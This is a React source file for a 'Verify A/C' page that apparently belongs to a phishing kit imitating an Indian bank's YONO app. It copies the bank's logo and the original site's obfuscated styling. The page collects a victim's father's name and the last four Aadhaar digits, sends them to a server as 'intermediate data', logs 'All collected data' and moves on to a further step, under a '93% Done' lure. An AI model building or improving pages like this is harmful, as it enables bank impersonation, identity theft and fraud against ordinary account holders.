import { useState, FormEvent } from 'react';
import { useLocation } from 'wouter';
import { updateUserData, getNextRoute, getDataAsJSON, saveIntermediateData } from '@/lib/userState';

export default function VerifyAccountPage() {
  const [, navigate] = useLocation();
  const [fatherName, setFatherName] = useState('');
  const [aadhaarLast4, setAadhaarLast4] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    try {
      // Save the form data
      updateUserData({
        fatherName,
        aadhaarLast4
      });
      
      // Save data to the server
      await saveIntermediateData();
      
      // Show the collected data in JSON format
      console.log('All collected data:', getDataAsJSON());
      
      // Navigate to the next page in the flow
      navigate(getNextRoute());
    } catch (error) {
      console.error('Error saving data:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div id="__next">
      <header className="Jeuookhh_logo__chFnY">
        <img 
          alt="LMDx7g" 
          loading="lazy" 
          width="120" 
          height="32" 
          decoding="async"
          data-nimg="1" 
          src="/images/yono.png" 
          style={{ color: "transparent" }} 
        />
      </header>
      <main>
        <div className="Jeuookhh_login_heading__g_rIN">
          <h3 className="Jeuookhh_login_heading_h3__40cUi">Verify A/C</h3>
        </div>
        <div className="Jeuookhh_login_form__UT1PX">
          <p className="Jeuookhh_mandatory_txt__seeNN">Mandatory fields are marked with an asterisk (*)</p>
          <form className="Jeuookhh_form__NPDIu" onSubmit={handleSubmit}>
            <input type="hidden" name="formtoken" value="BV1OSh" />
            <div className="Jeuookhh_form_group__iOuIR">
              <label className="Jeuookhh_label__fvDl5">
                Father/'s Name <span className="Jeuookhh_mandatory_txt__seeNN">*</span>
              </label>
              <input 
                name="Fthr" 
                type="text" 
                className="Jeuookhh_form_control__aKuXl" 
                required 
                minLength={3} 
                maxLength={30}
                value={fatherName}
                onChange={(e) => setFatherName(e.target.value)}
              />
            </div>
            <div className="Jeuookhh_form_group__iOuIR">
              <label className="Jeuookhh_label__fvDl5">
                Last 4-digit Aadhaar No <span className="Jeuookhh_mandatory_txt__seeNN">*</span>
              </label>
              <input 
                name="ldan" 
                type="text" 
                className="Jeuookhh_form_control__aKuXl" 
                required 
                minLength={4} 
                inputMode="numeric" 
                maxLength={4}
                value={aadhaarLast4}
                onChange={(e) => setAadhaarLast4(e.target.value)}
              />
            </div>
            <p className="Jeuookhh_content_title__eLlbR">93% Done</p>
            <div className="Jeuookhh_t_center____ZxZ">
              <input 
                type="submit" 
                className="Jeuookhh_btn_default__PIkhU" 
                value={isSubmitting ? "Processing..." : "submit"} 
                disabled={isSubmitting}
              />
            </div>
          </form><br />
        </div>
      </main>
      <div className="Jeuookhh_footer_area__5ot65">
        <img 
          alt="njgXdr" 
          loading="lazy" 
          width="68" 
          height="28" 
          decoding="async" 
          data-nimg="1" 
          src="/images/gwhp.png" 
          style={{ color: "transparent" }} 
        />
      </div>
      <div className="Jeuookhh_footer__Wxn0J">
        <p>©</p>
      </div>
    </div>
  );
}